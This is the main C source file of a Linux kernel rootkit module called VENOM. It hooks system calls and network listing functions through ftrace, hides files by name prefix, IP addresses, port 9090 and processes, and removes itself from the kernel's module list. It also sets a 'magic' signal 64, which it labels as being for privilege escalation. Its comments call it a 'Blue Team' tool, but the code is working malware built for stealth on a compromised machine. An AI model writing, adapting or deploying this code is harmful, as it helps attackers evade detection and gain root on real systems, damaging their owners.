#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include "hooks/mounts.h"  
#include "include/headers.h"
#include "ftrace/ftrace.h"
#include "hooks/read.h"
#include "hooks/write.h"
#include "hooks/pid_hiding.h" 
#include "hooks/getdents.h"
#include "hooks/kill.h"
#include "hooks/ioctl.h"
#include "hooks/insmod.h"
#include "hooks/network.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Trevohack");
MODULE_DESCRIPTION("Advance LKM");
MODULE_VERSION("4.0");


#define HIDDEN_PORT 9090 
#define MAGIC_KILL_SIGNAL 64 
#define MAX_HIDDEN_PREFIXES 10
#define MAX_HIDDEN_IPS 5


static char *hidden_prefixes[MAX_HIDDEN_PREFIXES] = {
    "source-code",
    "classified",
    "internal",
    "venom",
    "trevohack",
    "hack",
    ".defense",
    NULL
};


static char *hidden_ips[MAX_HIDDEN_IPS] = {
    "10.0.0.100",
    "192.168.1.50", 
    "172.16.0.10",
    NULL
};


static int hidden = 0;
static int activate_stealth = 1;

static struct ftrace_hook all_hooks[] = {
    HOOK("__x64_sys_write", hooked_write, &orig_write),
    HOOK("__x64_sys_read", hooked_read, &orig_read),
    HOOK("__x64_sys_mount", hook_mount, &orig_mount),
    HOOK("__x64_sys_move_mount", hook_move_mount, &orig_move_mount),
    HOOK("__x64_sys_getdents64", hooked_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hooked_getdents, &orig_getdents),
    
    HOOK("__x64_sys_init_module", hooked_init_module, &orig_init_module),
    HOOK("__x64_sys_finit_module", hooked_finit_module, &orig_finit_module),
    HOOK("__x64_sys_delete_module", hooked_delete_module, &orig_delete_module),
    
    HOOK("__x64_sys_kill", hooked_kill, &orig_kill),
    
    HOOK("__x64_sys_ioctl", hooked_ioctl, &orig_ioctl),
    
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("udp4_seq_show", hooked_udp4_seq_show, &orig_udp4_seq_show),
    HOOK("udp6_seq_show", hooked_udp6_seq_show, &orig_udp6_seq_show),
    HOOK("tpacket_rcv", hooked_tpacket_rcv, &orig_tpacket_rcv),
};


notrace static void hide_module(void) {
    if (THIS_MODULE->list.prev) {
        list_del(&THIS_MODULE->list);
        hidden = 1;
    }
}


notrace static void init_rootkit_config(void) {
    set_hidden_port(HIDDEN_PORT);
    set_magic_signal(MAGIC_KILL_SIGNAL);
    set_hidden_prefixes(hidden_prefixes);
    set_hidden_ips(hidden_ips);
}

notrace static int __init venom_init(void) {
    int err;
    
    // printk(KERN_INFO "[VENOM] Loading Advanced Blue Team Rootkit v4.0\n");
    
    init_rootkit_config();
    

    err = fh_install_hooks(all_hooks, ARRAY_SIZE(all_hooks));
    if (err) {
        printk(KERN_ERR "[VENOM] Failed to install hooks: %d\n", err);
        return err;
    }
    
    init_pid_hiding();
    
    if (activate_stealth) {
        hide_module();
        // printk(KERN_INFO "[VENOM] Module hidden from lsmod\n");
    }
    

    printk(KERN_INFO "=============================================================================\n");
    printk(KERN_INFO "=                                                                           =\n");
    printk(KERN_INFO "=                          [ VENOM IMPLANTED ]                              =\n");
    printk(KERN_INFO "=                          Made by Trevohack & Devil0x1                     =\n");
    printk(KERN_INFO "=                                                                           =\n");
    printk(KERN_INFO "=============================================================================\n"); 

    printk(KERN_INFO "[VENOM] All protection systems active\n");
    printk(KERN_INFO "[VENOM] Protected port: %d\n", HIDDEN_PORT);
    printk(KERN_INFO "[VENOM] Magic signal: %d (for privilege escalation)\n", MAGIC_KILL_SIGNAL); 
    
    
    return 0;
}

notrace static void __exit venom_exit(void) {
    // printk(KERN_INFO "[VENOM] Removing Advanced Blue Team Rootkit\n");
    fh_remove_hooks(all_hooks, ARRAY_SIZE(all_hooks));
    
    printk(KERN_INFO "[VENOM] All hooks removed\n");
}

module_init(venom_init);
module_exit(venom_exit); 
